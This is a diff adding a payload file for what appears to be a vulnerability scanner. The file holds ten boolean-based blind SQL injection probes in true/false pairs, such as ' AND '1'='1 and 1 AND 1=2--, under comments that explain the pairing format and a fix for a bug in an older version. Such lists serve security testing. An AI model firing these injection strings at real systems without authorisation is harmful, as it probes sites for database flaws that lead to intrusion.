@@ -1,0 +1,20 @@
+# FORMAT: Each pair is TRUE payload followed immediately by FALSE payload
+# Scanner reads these in pairs (line 0+1, line 2+3, line 4+5, etc.)
+# TRUE = condition that is always true → server returns normal/full response
+# FALSE = condition that is always false → server returns different/empty response
+# ============================================
+# OLD FILE - Replaced 2025-03-31
+# Reason: BUG 13 - old file had no guaranteed TRUE/FALSE pairs
+# Lines 11-12 were version-conditional, not guaranteed true/false
+# Lines 40+ were single payloads not paired at all
+# ============================================
+' AND '1'='1
+' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1' AND '1'='1--
+1' AND '1'='2--
+1 AND 1=1--
+1 AND 1=2--
